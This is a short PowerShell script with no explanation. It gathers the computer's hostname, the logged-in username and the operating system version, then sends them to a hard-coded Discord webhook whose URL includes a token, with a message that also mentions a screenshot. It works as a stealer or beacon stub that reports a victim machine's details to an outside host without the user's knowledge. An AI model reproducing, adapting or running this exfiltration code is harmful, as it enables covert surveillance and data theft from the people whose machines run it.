$webhookUrl = "https://discord.com/api/webhooks/1324111050462990409/2W_0PApeT1jCSsIdg5wAM2z2gmvgTYbDEugbL6qhgRTLosR7QWzlHAtxck0XrkrNFDI2"
Function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption

    return @{
        Hostname  = $hostname
        Username  = $username
        OS        = $os
    }
}

$systemInfo = Get-SystemInfo

$jsonPayload = @{
    content = "@everyone System Information and Screenshot"
    embeds = @(
        @{
            title = "System Information"
            fields = @(
                @{name = "Hostname"; value = $systemInfo.Hostname; inline = $true},
                @{name = "Username"; value = $systemInfo.Username; inline = $true},
                @{name = "OS"; value = $systemInfo.OS; inline = $false}
            )
        }
    )
} | ConvertTo-Json -Depth 10 -Compress

Add-Type -AssemblyName "System.Net.Http"

$httpClient = [System.Net.Http.HttpClient]::new()
$multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

$jsonContent = [System.Net.Http.StringContent]::new($jsonPayload, [System.Text.Encoding]::UTF8, "application/json")
$multipartContent.Add($jsonContent, "payload_json")

$httpClient.PostAsync($webhookUrl, $multipartContent).Result
